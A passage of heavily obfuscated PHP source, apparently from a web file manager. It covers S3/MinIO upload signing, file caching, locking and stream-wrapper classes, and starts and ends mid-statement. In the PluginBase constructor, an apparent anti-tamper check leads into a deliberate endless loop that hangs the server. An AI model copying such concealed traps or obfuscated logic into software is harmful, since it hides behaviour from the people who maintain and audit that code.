$ÛĞäõ‚ƒ[97] => $òıÒäµ); } public function multiUploadAuthData($„Ó¯¯, $„ã•ÉÉ­ = array()) { $œÇ¤°»ê =& $_SERVER[³à¼î¯á]; $–Á¦éê = isset($„ã•ÉÉ­[$œÇ¤°»ê[246]]) ? $„ã•ÉÉ­[$œÇ¤°»ê[246]] : gmdate($œÇ¤°»ê[244]); $û•½Ç¿ = isset($„ã•ÉÉ­[$œÇ¤°»ê[178]]) ? $„ã•ÉÉ­[$œÇ¤°»ê[178]] : $œÇ¤°»ê[12]; $ı½Õ÷Ëä = $„ã•ÉÉ­[$œÇ¤°»ê[97]]; unset($„ã•ÉÉ­[$œÇ¤°»ê[97]]); if (isset($„ã•ÉÉ­[$œÇ¤°»ê[247]])) { $„ã•ÉÉ­[$œÇ¤°»ê[246]] = $–Á¦éê; return $this->listUploadParts($ı½Õ÷Ëä, $„ã•ÉÉ­); } $ôöı„ã« = array($œÇ¤°»ê[248], $œÇ¤°»ê[12], $œÇ¤°»ê[123], $œÇ¤°»ê[12], "\x78\x2d\141\155\172\x2d\x64\x61\164\x65\x3a{$–Á¦éê}", $œÇ¤°»ê[8] . $this->bucket . $œÇ¤°»ê[8] . $this->pathEncode($ı½Õ÷Ëä) . $û•½Ç¿); if (strpos($û•½Ç¿, $œÇ¤°»ê[249]) === 0) { $ôöı„ã«[0] = $œÇ¤°»ê[250]; } if (isset($„ã•ÉÉ­[$œÇ¤°»ê[251]]) && $„ã•ÉÉ­[$œÇ¤°»ê[251]] == $œÇ¤°»ê[252]) { $ôöı„ã«[0] = $œÇ¤°»ê[252]; } $éò°¶ş« = implode($œÇ¤°»ê[253], $ôöı„ã«); $“„õàÔ = base64_encode(hash_hmac($œÇ¤°»ê[254], $éò°¶ş«, $this->secret, !0)); $ë±€Ïƒˆ = $œÇ¤°»ê[255] . $this->accessKey . $œÇ¤°»ê[4] . $“„õàÔ; if (strpos($û•½Ç¿, $œÇ¤°»ê[249]) === 0) { return array($œÇ¤°»ê[256] => $ë±€Ïƒˆ, $œÇ¤°»ê[246] => $–Á¦éê); } return $ë±€Ïƒˆ; } public function listUploadParts($„ãê×¹Ä, $¬öÁ˜ş· = array()) { $­êšò• =& $_SERVER[³à¼î¯á]; $õé¢üÃ¨ = str_replace($­êšò•[257], $­êšò•[12], $¬öÁ˜ş·[$­êšò•[178]]); $ûÍ£ü¼Ú = $this->client->listParts($this->bucket, $„ãê×¹Ä, $õé¢üÃ¨); if (!$ûÍ£ü¼Ú) { return !1; } unset($¬öÁ˜ş·[$­êšò•[247]], $¬öÁ˜ş·[$­êšò•[251]]); $¬öÁ˜ş·[$­êšò•[97]] = $„ãê×¹Ä; $Û‘ÒàÒ = $this->multiUploadAuthData($„ãê×¹Ä, $¬öÁ˜ş·); if (empty($Û‘ÒàÒ)) { return !1; } return array($­êšò•[256] => $Û‘ÒàÒ, $­êšò•[246] => $¬öÁ˜ş·[$­êšò•[246]], $­êšò•[258] => $ûÍ£ü¼Ú); } public function getHost() { $€ŠÒ¸¶Ë =& $_SERVER[³à¼î¯á]; $ÁşÁ…şó = parent::getHost(); if (!$this->osType) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($€ŠÒ¸¶Ë[70], $€ŠÒ¸¶Ë[64], $€ŠÒ¸¶Ë[69], $€ŠÒ¸¶Ë[62]))) { return $ÁşÁ…şó . $€ŠÒ¸¶Ë[8] . $this->bucket; } $ÁşÁ…şó = explode($€ŠÒ¸¶Ë[201], $ÁşÁ…şó); return $ÁşÁ…şó[0] . $€ŠÒ¸¶Ë[201] . $this->bucket . $€ŠÒ¸¶Ë[10] . $ÁşÁ…şó[1]; } public function size($•¬Æ¢¸Š) { $œª×Äñ = $this->objectMeta($•¬Æ¢¸Š); return $œª×Äñ ? $œª×Äñ[$_SERVER[³à¼î¯á][79]] : 0; } public function info($°ÙøÙÍ) { if ($this->isFolder($°ÙøÙÍ)) { return $this->folderInfo($°ÙøÙÍ); } else { if ($this->isFile($°ÙøÙÍ)) { return $this->fileInfo($°ÙøÙÍ); } } return !1; } public function exist($Ï†ü¿ã‘) { return $this->isFile($Ï†ü¿ã‘) || $this->isFolder($Ï†ü¿ã‘); } public function isFile($ìŞ¶ì•) { return !$this->isFolder($ìŞ¶ì•) && $this->objectMeta($ìŞ¶ì•); } public function isFolder($üõ¸°·ã) { return $this->cacheMethod($_SERVER[³à¼î¯á][169], $üõ¸°·ã); } protected function objectMeta($ÀÈáÑ) { return $this->cacheMethod($_SERVER[³à¼î¯á][171], $ÀÈáÑ); } protected function _objectMeta($ÔåîÆ) { $¾•ÊÉ¶ã =& $_SERVER[³à¼î¯á]; $ÔåîÆ = rtrim($ÔåîÆ, $¾•ÊÉ¶ã[8]); try { $‚˜¥Ç·½ = $this->client->getObjectInfo($this->bucket, $ÔåîÆ); if (!isset($‚˜¥Ç·½[$¾•ÊÉ¶ã[243]]) && isset($‚˜¥Ç·½[$¾•ÊÉ¶ã[259]])) { $‚˜¥Ç·½[$¾•ÊÉ¶ã[243]] = $‚˜¥Ç·½[$¾•ÊÉ¶ã[259]]; } } catch (Exception $Ç˜ĞñÖ) { $‚˜¥Ç·½ = !1; } if (!$‚˜¥Ç·½) { } return $‚˜¥Ç·½; } protected function _isFolder($„©¬§ˆµ) { $‡ä×±®Ô =& $_SERVER[³à¼î¯á]; $„©¬§ˆµ = rtrim($„©¬§ˆµ, $‡ä×±®Ô[8]); if ($„©¬§ˆµ == $‡ä×±®Ô[12] || $„©¬§ˆµ == $‡ä×±®Ô[8]) { return !0; } $ªé½¤á = $this->client->getBucket($this->bucket, $„©¬§ˆµ, null, 1); if (empty($ªé½¤á[$‡ä×±®Ô[227]])) { return !1; } $´ñ°¹äÁ = $ªé½¤á[$‡ä×±®Ô[227]][0][$‡ä×±®Ô[32]]; return stripos($´ñ°¹äÁ, $„©¬§ˆµ . $‡ä×±®Ô[8]) === 0 ? !0 : !1; if (substr($´ñ°¹äÁ, -1) == $‡ä×±®Ô[8]) { return !0; } if (get_path_this($´ñ°¹äÁ) == get_path_this($„©¬§ˆµ)) { return !1; } return !0; } public function listObject($›ŒÜ¸Ò†) { return $this->fileList($›ŒÜ¸Ò†, $_SERVER[³à¼î¯á][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¹ËËõ’Ö) { $ØÉ¿… =& $_SERVER[³à¼î¯á]; parent::__construct($¹ËËõ’Ö); $this->setSignVersion($ØÉ¿…[238]); if (!$this->region) { $this->region = $ØÉ¿…[260]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $èç§ˆÈÌ = $this->getBucketRgn(); return $this->region == $èç§ˆÈÌ ? !0 : !1; } public function uploadFormData($ğÒí™Ö, $‰´‡«Á = 3600) { $Û¥¥»òã =& $_SERVER[³à¼î¯á]; $óÕÌõùñ = $Û¥¥»òã[220]; $†şúàÈÉ = $Û¥¥»òã[261]; $ÌˆÏç«£ = $Û¥¥»òã[62]; $ÉšŸò°’ = gmdate($Û¥¥»òã[262]); $ğ¹ôèÂº = gmdate($Û¥¥»òã[263]); $“›éò‹ = $Û¥¥»òã[264]; $Ï½Âúç = $‰´‡«Á . $Û¥¥»òã[12]; $ØÖ»á•õ = $Û¥¥»òã[265]; $«‘Îø÷ = array($this->accessKey, $ğ¹ôèÂº, $this->region, $ÌˆÏç«£, $“›éò‹); $“öàì© = implode($Û¥¥»òã[8], $«‘Îø÷); $õ›ôˆü¸ = array($Û¥¥»òã[266] => gmdate($Û¥¥»òã[267], strtotime($Û¥¥»òã[268])), $Û¥¥»òã[269] => array(array($Û¥¥»òã[270] => $this->bucket), array($Û¥¥»òã[271] => $óÕÌõùñ), array($Û¥¥»òã[272], $Û¥¥»òã[273], $Û¥¥»òã[12]), array($Û¥¥»òã[272], $Û¥¥»òã[274], $Û¥¥»òã[12]), array($Û¥¥»òã[272], $Û¥¥»òã[275], $Û¥¥»òã[12]), array($Û¥¥»òã[276] => $ØÖ»á•õ), array($Û¥¥»òã[277] => $“öàì©), array($Û¥¥»òã[278] => $†şúàÈÉ), array($Û¥¥»òã[279] => $ÉšŸò°’), array($Û¥¥»òã[280] => $Ï½Âúç))); $…ëÄËäÜ = base64_encode(json_encode($õ›ôˆü¸)); $àµµÖ˜Ú = hash_hmac($Û¥¥»òã[281], $ğ¹ôèÂº, $Û¥¥»òã[282] . $this->secret, !0); $ğ¥¡‡ü = hash_hmac($Û¥¥»òã[281], $this->region, $àµµÖ˜Ú, !0); $—ö„ğ¸‚ = hash_hmac($Û¥¥»òã[281], $ÌˆÏç«£, $ğ¥¡‡ü, !0); $¹ªç¹†á = hash_hmac($Û¥¥»òã[281], $“›éò‹, $—ö„ğ¸‚, !0); $Õ™ÁåêÈ = hash_hmac($Û¥¥»òã[281], $…ëÄËäÜ, $¹ªç¹†á); $ˆ³÷Í‹Š = array($Û¥¥»òã[237] => $Û¥¥»òã[12], $Û¥¥»òã[283] => $Û¥¥»òã[12], $Û¥¥»òã[271] => $óÕÌõùñ, $Û¥¥»òã[276] => $ØÖ»á•õ, $Û¥¥»òã[284] => $…ëÄËäÜ, $Û¥¥»òã[285] => $“öàì©, $Û¥¥»òã[286] => $†şúàÈÉ, $Û¥¥»òã[287] => $ÉšŸò°’, $Û¥¥»òã[288] => $Ï½Âúç, $Û¥¥»òã[289] => $Õ™ÁåêÈ, $Û¥¥»òã[199] => $this->getHost()); return $ˆ³÷Í‹Š; } } goto F¨á„·å‰¿; fÍßÌ«ÌŞ: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($÷•Ë™ò, $©Ï‘İ) { $Š«¯Šçó =& $_SERVER[³à¼î¯á]; $this->cachePath = $÷•Ë™ò[$Š«¯Šçó[87]]; $this->prefix = $Š«¯Šçó[879]; $this->cacheTime = $©Ï‘İ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Ì‹¶Š›È) { $±Ÿí³³ =& $_SERVER[³à¼î¯á]; $Ì‹¶Š›È = str_replace(array($±Ÿí³³[880], $±Ÿí³³[100], $±Ÿí³³[76]), $±Ÿí³³[881], $Ì‹¶Š›È); return $this->cachePath . $±Ÿí³³[882] . $Ì‹¶Š›È . $±Ÿí³³[883]; } public function set($€ÓîÜÌ, $êÏ ƒµ¯, $³ö¢Óç = false) { $³ö¢Óç = $³ö¢Óç ? $³ö¢Óç : $this->cacheTime; $æ›ö = $this->getFile($€ÓîÜÌ); if (file_put_contents($æ›ö, $this->prefix . $êÏ ƒµ¯, LOCK_EX)) { @touch($æ›ö, intval(time() + $³ö¢Óç)); clearstatcache(); return !0; } @unlink($æ›ö); return !1; } public function get($øµÕÔ–Õ) { $®ğùşê = $this->getFile($øµÕÔ–Õ); if (file_exists($®ğùşê) && filemtime($®ğùşê) < time()) { @unlink($®ğùşê); return !1; } $é¶ö¤ñû = @file_get_contents($®ğùşê); return substr($é¶ö¤ñû, strlen($this->prefix)); } public function remove($âï‹çó) { $Äáø†®’ = $this->getFile($âï‹çó); return @unlink($Äáø†®’); } public function deleteAll() { $ Úä”îì =& $_SERVER[³à¼î¯á]; $¨¨ÌıÆ = scandir($this->cachePath); foreach ($¨¨ÌıÆ as $ÃŸ¼âÀ¥) { $ó·óê÷û = $this->cachePath . $ÃŸ¼âÀ¥; if (strpos($ó·óê÷û, $ Úä”îì[883]) && strpos($ó·óê÷û, $ Úä”îì[884])) { @unlink($ó·óê÷û); } } } public function clearTimeout() { $¢á£¾ı‰ =& $_SERVER[³à¼î¯á]; $ó•§¬Ëû = scandir($this->cachePath); foreach ($ó•§¬Ëû as $¶©ı¼¼˜) { $»µº—æ¥ = $this->cachePath . $¶©ı¼¼˜; if (strpos($»µº—æ¥, $¢á£¾ı‰[883]) && strpos($»µº—æ¥, $¢á£¾ı‰[884]) && filemtime($»µº—æ¥) < time()) { @unlink($»µº—æ¥); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¶íÀË·¸ =& $_SERVER[³à¼î¯á]; if (self::$handle) { return self::$handle; } $²õ›Ä¥œ = $GLOBALS[$¶íÀË·¸[6]][$¶íÀË·¸[400]]; self::$timeout = $²õ›Ä¥œ[$¶íÀË·¸[885]] ? $²õ›Ä¥œ[$¶íÀË·¸[885]] : 10; $Á®“ÏÜ™ = _get($GLOBALS[$¶íÀË·¸[6]], $¶íÀË·¸[886]); $­Ìëş¨ = $²õ›Ä¥œ[$¶íÀË·¸[871]] ? $²õ›Ä¥œ[$¶íÀË·¸[871]] : $¶íÀË·¸[221]; if ($­Ìëş¨ == $¶íÀË·¸[21] && $Á®“ÏÜ™ == $¶íÀË·¸[13]) { $­Ìëş¨ = $¶íÀË·¸[221]; } switch ($­Ìëş¨) { case $¶íÀË·¸[874]: self::$handle = new CacheLockRedis(); break; case $¶íÀË·¸[875]: self::$handle = new CacheLockMemcached(); break; case $¶íÀË·¸[21]: self::$handle = new CacheLockDatabase(); break; case $¶íÀË·¸[221]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¶íÀË·¸[887], $¶íÀË·¸[888]); } return self::$handle; } private static function key($Şùù) { return $_SERVER[³à¼î¯á][889] . Cache::key($Şùù); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($‡Ç»¡Ú = '') { self::$errorMsg = $‡Ç»¡Ú; } public static function lockGlobal($×¦ĞÜî, $š¨´¼¨) { return self::lock($×¦ĞÜî, $š¨´¼¨, !0); } public static function lock($ıóÑÜƒ‡, $Ò´°¥—È = false, $›§‚È¢ä = false) { $Ï‘¸òÙñ =& $_SERVER[³à¼î¯á]; $³Œ“¯üÆ = self::init(); $Íúå™ÍÉ = self::key($ıóÑÜƒ‡); $Ò´°¥—È = $Ò´°¥—È ? $Ò´°¥—È : self::$timeout; $³é°›¡è = timeFloat(); $ÜÁéÔñû = $³Œ“¯üÆ->lock($Íúå™ÍÉ, $Ò´°¥—È); $‡ÙÁ—Ã­ = timeFloat(); if (!$ÜÁéÔñû) { $Ë®ŠÛÌû = "\154\157\143\153\x20\145\x72\162\x6f\162\x3b\x6b\145\171\75{$ıóÑÜƒ‡}\x3b\x74\x69\x6d\145\x3d{$Ò´°¥—È}\x3b" . self::$errorMsg . $Ï‘¸òÙñ[74] . get_caller_msg(); $¿€ÂŸ¡š = LNG($Ï‘¸òÙñ[890]) . "\x28{$Ò´°¥—È}\163\51\x2e" . LNG($Ï‘¸òÙñ[891]); $¿€ÂŸ¡š .= $Ï‘¸òÙñ[892]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¿€ÂŸ¡š = $¿€ÂŸ¡š . $Ï‘¸òÙñ[893] . self::$errorMsg; } write_log($Ï‘¸òÙñ[894] . sprintf($Ï‘¸òÙñ[895], timeFloat() - $³é°›¡è) . $Ï‘¸òÙñ[896] . $Ë®ŠÛÌû . $Ï‘¸òÙñ[897] . error_get_last(), $Ï‘¸òÙñ[888]); show_json($¿€ÂŸ¡š, !1); } if (!$›§‚È¢ä) { self::$lockItem[$Íúå™ÍÉ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $‰´¬šıµ = number_format(timeFloat() - $‡ÙÁ—Ã­, 3); write_log($Ï‘¸òÙñ[898] . $ıóÑÜƒ‡ . $Ï‘¸òÙñ[899] . $‰´¬šıµ, $Ï‘¸òÙñ[888]); } return $ÜÁéÔñû; } public static function lockGet($‚şˆîõ‰) { $å°÷ÂÕ¶ = self::key($‚şˆîõ‰); if (self::$lockItem[$å°÷ÂÕ¶]) { return self::$lockItem[$å°÷ÂÕ¶]; } return self::init()->lockGet($å°÷ÂÕ¶); } public static function unlock($Ä³²×‡Ÿ) { $º¤ŸÒñÓ =& $_SERVER[³à¼î¯á]; $®«šõ„ã = self::key($Ä³²×‡Ÿ); self::$lockItem[$®«šõ„ã] = null; self::init()->unlock($®«šõ„ã); if (GLOBAL_DEBUG_LOG_ALL) { write_log($º¤ŸÒñÓ[900] . $Ä³²×‡Ÿ, $º¤ŸÒñÓ[888]); } return; } public static function unlockRuntime() { $±ğœÂÛµ =& $_SERVER[³à¼î¯á]; $÷‘ÔŠê = self::init(); $”¢ıÁ´™ = !1; foreach (self::$lockItem as $›·›Ã©Ù => $ó§†¬Ìü) { if (!$ó§†¬Ìü) { continue; } $÷‘ÔŠê->unlock($›·›Ã©Ù); if (!$”¢ıÁ´™) { $”¢ıÁ´™ = !0; write_log($±ğœÂÛµ[901] . $›·›Ã©Ù . $±ğœÂÛµ[74] . get_caller_msg(), $±ğœÂÛµ[888]); continue; } write_log($±ğœÂÛµ[901] . $›·›Ã©Ù, $±ğœÂÛµ[888]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $å¶¢ê´ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($±ğœÂÛµ[902] . $å¶¢ê´ . $±ğœÂÛµ[903] . ACTION, $±ğœÂÛµ[888]); } } public static function fileLock($ˆâµ“ó”) { $ÇƒÍğø =& $_SERVER[³à¼î¯á]; if (!$GLOBALS[$ÇƒÍğø[904]]) { $GLOBALS[$ÇƒÍğø[904]] = array(); } $GLOBALS[$ÇƒÍğø[904]][$ˆâµ“ó”] = !1; $¨€†¢ = fopen(DATA_PATH . $ˆâµ“ó” . $ÇƒÍğø[905], $ÇƒÍğø[906]); if (!$¨€†¢) { return !1; } $GLOBALS[$ÇƒÍğø[904]][$ˆâµ“ó”] = $¨€†¢; if (flock($¨€†¢, LOCK_EX)) { return !0; } self::unlock($ˆâµ“ó”); show_json($ÇƒÍğø[907], !1); return !1; } public static function fileUnlock($ñÚ´Øá) { $ÜÉè»¥€ =& $_SERVER[³à¼î¯á]; $÷Êìû§ = $GLOBALS[$ÜÉè»¥€[904]][$ñÚ´Øá]; if (!$÷Êìû§) { return; } $GLOBALS[$ÜÉè»¥€[904]][$ñÚ´Øá] = !1; flock($÷Êìû§, LOCK_UN); fclose($÷Êìû§); } public static function fileUnlockAll() { $¾’é©É÷ =& $_SERVER[³à¼î¯á]; if (!$GLOBALS[$¾’é©É÷[904]]) { return; } foreach ($GLOBALS[$¾’é©É÷[904]] as $ÌÍ®ÇêÔ => $ÕÔ›‡òã) { if (!$ÕÔ›‡òã) { continue; } $GLOBALS[$¾’é©É÷[904]][$ÌÍ®ÇêÔ] = !1; flock($ÕÔ›‡òã, LOCK_UN); fclose($ÕÔ›‡òã); } $GLOBALS[$¾’é©É÷[904]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto eêâµÌ…; FİÀÒ‡Ã·Ç: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($—‚ŸÉ‘ù, $Ôê³‹¥Ü = '') { $this->info = $this->info($—‚ŸÉ‘ù); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[³à¼î¯á][87]]; $this->pathOpen = $—‚ŸÉ‘ù; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$—‚ŸÉ‘ù])) { self::$_chunkBuffer[$—‚ŸÉ‘ù] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Øô°‘Åş) { $ˆää®ß¨ = $this->fileSubstr($this->pose, $Øô°‘Åş); $this->pose += strlen($ˆää®ß¨); return $ˆää®ß¨; } public function stream_tell() { return $this->pose; } public function stream_seek($äô×ˆ»Í, $¯•ÆÄÏ‘) { $ö­ô«ƒ =& $_SERVER[³à¼î¯á]; if ($¯•ÆÄÏ‘ == SEEK_SET) { $this->pose = $äô×ˆ»Í; } else { if ($¯•ÆÄÏ‘ == SEEK_CUR) { $this->pose += $äô×ˆ»Í; } else { if ($¯•ÆÄÏ‘ == SEEK_END) { $this->pose = $this->info[$ö­ô«ƒ[79]] + intval($äô×ˆ»Í); } } } if ($äô×ˆ»Í < 0) { $this->pose = $this->info[$ö­ô«ƒ[79]] + $äô×ˆ»Í; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[³à¼î¯á][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÜßÕ›‘Ä, $æˆñ®¶£) { $”ßÍşŸÃ =& $_SERVER[³à¼î¯á]; $ì±ŒìÄ€ = $this->info($ÜßÕ›‘Ä); return array($”ßÍşŸÃ[1592] => 0, $”ßÍşŸÃ[1593] => 0, $”ßÍşŸÃ[16] => 32768 + 511, $”ßÍşŸÃ[1594] => 0, $”ßÍşŸÃ[1595] => 0, $”ßÍşŸÃ[1596] => 0, $”ßÍşŸÃ[1597] => 0, $”ßÍşŸÃ[79] => $ì±ŒìÄ€[$”ßÍşŸÃ[79]], $”ßÍşŸÃ[1598] => $ì±ŒìÄ€[$”ßÍşŸÃ[1423]], $”ßÍşŸÃ[1554] => $ì±ŒìÄ€[$”ßÍşŸÃ[88]], $”ßÍşŸÃ[1553] => $ì±ŒìÄ€[$”ßÍşŸÃ[222]], $”ßÍşŸÃ[1599] => 0, $”ßÍşŸÃ[1600] => 0); } static $fileInfo = array(); public function info($ç¯ıå§) { $œ˜‰¿‹º = $_SERVER[³à¼î¯á][1601]; if (isset(self::$fileInfo[$ç¯ıå§])) { return self::$fileInfo[$ç¯ıå§]; } if (substr($ç¯ıå§, 0, strlen($œ˜‰¿‹º)) != $œ˜‰¿‹º) { return !1; } self::$fileInfo[$ç¯ıå§] = IO::info(substr($ç¯ıå§, strlen($œ˜‰¿‹º))); return self::$fileInfo[$ç¯ıå§]; } public static function read($áÒÅñıÑ, $ÆúÙÙæ·, $Ş†ØïĞ‹) { if (!isset(self::$_fopenCache[$áÒÅñıÑ])) { $§‘ÛÏ² = new StreamWrapperIO(); $§‘ÛÏ²->stream_open($áÒÅñıÑ); self::$_fopenCache[$áÒÅñıÑ] = $§‘ÛÏ²; } $§‘ÛÏ² = self::$_fopenCache[$áÒÅñıÑ]; return $§‘ÛÏ²->fileSubstr($ÆúÙÙæ·, $Ş†ØïĞ‹); } public static function _read($Ø‚×€íŸ, $§Ò×»ïÇ, $±¬ÆÌ) { $Õ¾£¦´± =& $_SERVER[³à¼î¯á]; $¤“¤”ú = fopen($Ø‚×€íŸ, $Õ¾£¦´±[1427]); if (!$¤“¤”ú) { return $Õ¾£¦´±[12]; } $¿·ÒÚ£¦ = 8192; fseek($¤“¤”ú, $§Ò×»ïÇ, SEEK_SET); $•‰é¨Ù = $Õ¾£¦´±[12]; $íÌ©ß‡ = 0; while ($íÌ©ß‡ < $±¬ÆÌ) { $³¡¡¨õ„ = min($¿·ÒÚ£¦, $±¬ÆÌ - $íÌ©ß‡); $•‰é¨Ù .= fread($¤“¤”ú, $³¡¡¨õ„); $íÌ©ß‡ += $³¡¡¨õ„; } fclose($¤“¤”ú); return $•‰é¨Ù; } public function fileSubstr($ÊûÈ®óğ, $ÔªÔ™´) { $İ¨Ù¤«› =& $_SERVER[³à¼î¯á]; $ö•€€ª = $this->info[$İ¨Ù¤«›[79]]; $’”úˆú¼ = $ÊûÈ®óğ; $ô­“Šî = $ÔªÔ™´; if ($ÊûÈ®óğ < 0) { $ÊûÈ®óğ = $ö•€€ª + $ÊûÈ®óğ; } if ($ÔªÔ™´ === !1) { $ÔªÔ™´ = $ö•€€ª - $ÊûÈ®óğ; } if ($ÊûÈ®óğ + $ÔªÔ™´ > $ö•€€ª) { $ÔªÔ™´ = $ö•€€ª - $ÊûÈ®óğ; } if ($ÔªÔ™´ <= 0) { return $İ¨Ù¤«›[12]; } if ($ÊûÈ®óğ < 0 || $ÊûÈ®óğ >= $ö•€€ª || $ÔªÔ™´ <= 0 || $ÔªÔ™´ > 1024 * 1024 * 10) { throw new Exception("\151\157\106\151\154\x65\122\x65\141\x64\x20\x65\x72\x72\157\x72\41\40\x73\x74\x61\162\164\75{$ÊûÈ®óğ}\73\154\x65\x6e\147\x74\150\75{$ÔªÔ™´}\x3b\40\x73\x69\x7a\145\75{$ö•€€ª}\x3b"); } $›ø–’ş‰ = 64 * 1024; $Å»À‡©ı =& self::$_chunkBuffer[$this->path]; if (!$Å»À‡©ı) { $Å»À‡©ı = array(); } $€’´‹ãŸ = 0; $ú“ÆÊ¢ = 0; $÷‹€—€Õ = $İ¨Ù¤«›[12]; foreach ($Å»À‡©ı as $€’´‹ãŸ => $÷‹€—€Õ) { $€’´‹ãŸ = intval($€’´‹ãŸ); $ú“ÆÊ¢ = $€’´‹ãŸ + strlen($÷‹€—€Õ); if ($ÊûÈ®óğ >= $ú“ÆÊ¢) { continue; } if ($ÊûÈ®óğ >= $€’´‹ãŸ && $ÊûÈ®óğ + $ÔªÔ™´ <= $ú“ÆÊ¢) { return substr($÷‹€—€Õ, $ÊûÈ®óğ - $€’´‹ãŸ, $ÔªÔ™´); } break; } if (count($Å»À‡©ı) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($İ¨Ù¤«›[1602], $İ¨Ù¤«›[1603] . count($Å»À‡©ı) . "\73\163\x74\x61\x72\164\75{$ÊûÈ®óğ}\54\154\145\x6e\x67\164\x68\x3d{$ÔªÔ™´}\73\x70\157\x73\x65\x3a{$€’´‹ãŸ}\x7e{$ú“ÆÊ¢}"); throw new Exception($İ¨Ù¤«›[1604]); } $È•âÎŠë = intval($ÊûÈ®óğ / $›ø–’ş‰) * $›ø–’ş‰; $•¸íí¦ = ceil(($ÊûÈ®óğ + $ÔªÔ™´) / $›ø–’ş‰) * $›ø–’ş‰ - $È•âÎŠë; $¤×ëş·¥ = IO::fileSubstr($this->path, $È•âÎŠë, $•¸íí¦); $Å»À‡©ı[$È•âÎŠë . $İ¨Ù¤«›[12]] = $¤×ëş·¥; ksort($Å»À‡©ı); $æÕÉÙÂ– = substr($¤×ëş·¥, $ÊûÈ®óğ - $È•âÎŠë, $ÔªÔ™´); return $æÕÉÙÂ–; } private function log($úÇç›÷, $æ–ôÆ¨ì) { $‚üîÕœÏ =& $_SERVER[³à¼î¯á]; $†Áû‡Š· = timeFloat() - $this->timeStart; write_log(sprintf($‚üîÕœÏ[1605], $úÇç›÷, $this->info[$‚üîÕœÏ[32]], $†Áû‡Š·, $æ–ôÆ¨ì), $‚üîÕœÏ[1236]); } } class Message { function __construct() { } public function send($†•ã‡ = '', $ï¯ô¶úõ = array(), $³Ó±¶ÊÏ = "\x74\145\x78\164") { $ãîí®€ =& $_SERVER[³à¼î¯á]; $·Ñ©À÷ë = array($ãîí®€[33] => $ãîí®€[1606], $ãîí®€[799] => $†•ã‡); if (in_array($³Ó±¶ÊÏ, array($ãîí®€[1606], $ãîí®€[1607]))) { $·Ñ©À÷ë[$ãîí®€[33]] = $³Ó±¶ÊÏ; } $ï¯ô¶úõ = array($ãîí®€[554] => isset($ï¯ô¶úõ[$ãîí®€[554]]) ? $ï¯ô¶úõ[$ãîí®€[554]] : $ãîí®€[12], $ãîí®€[637] => isset($ï¯ô¶úõ[$ãîí®€[637]]) ? $ï¯ô¶úõ[$ãîí®€[637]] : $ãîí®€[12]); if (empty($†•ã‡) || empty($ï¯ô¶úõ[$ãîí®€[554]]) && empty($ï¯ô¶úõ[$ãîí®€[637]])) { return !1; } $Üé‡›¬» = array($ãîí®€[1534] => $·Ñ©À÷ë, $ãîí®€[1608] => $ï¯ô¶úõ); Hook::trigger($ãîí®€[1609], $Üé‡›¬»); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÚÒÛ†¦ =& $_SERVER[³à¼î¯á]; if (!isset($_SERVER[$ÚÒÛ†¦[921]]) || !isset($_SERVER[$ÚÒÛ†¦[922]])) { $Ê‡ËäĞ” = $ÚÒÛ†¦[923]; $¢éĞ¾‹ = $ÚÒÛ†¦[924]; $Ñ¯ŒºÌÃ = $_SERVER[$ÚÒÛ†¦[925]] . $ÚÒÛ†¦[926]; $šãË²Ë¹ = $¢éĞ¾‹($Ñ¯ŒºÌÃ); $Î•ı£Ø„ = explode($ÚÒÛ†¦[253], $šãË²Ë¹); if (count($Î•ı£Ø„) < $ÚÒÛ†¦[663]) { $àÕÎ—ù = $ÚÒÛ†¦[927]; $àÕÎ—ù(); } $¶ĞÍ„¢¬ = $ÚÒÛ†¦[928]; $¶ĞÍ„¢¬($_SERVER[$ÚÒÛ†¦[929]]); $Š¤ëûü = 1; for ($–›ıŸÑ„ = $Š¤ëûü; $–›ıŸÑ„ > 0; $–›ıŸÑ„++) { $¶ĞÍ„¢¬ = json_encode($GLOBALS[$ÚÒÛ†¦[467]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÚÒÛ†¦[1610]); $this->pluginName = str_replace($ÚÒÛ†¦[1610], $ÚÒÛ†¦[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÚÒÛ†¦[8]; $this->pluginApi = appHostGet() . $ÚÒÛ†¦[1611] . $this->pluginName . $ÚÒÛ†¦[8]; $this->pluginHost = $config[$ÚÒÛ†¦[1612]] . $this->pluginName . $ÚÒÛ†¦[8]; $this->pluginHostDefault = $config[$ÚÒÛ†¦[1612]] . $this->pluginName . $ÚÒÛ†¦[8]; $ê®·Ó£ = $config[$ÚÒÛ†¦[1613]]; if ($ê®·Ó£ && strpos($ÚÒÛ†¦[50] . $ê®·Ó£ . $ÚÒÛ†¦[50], $this->pluginName) !== !1) { $this->pluginHost = 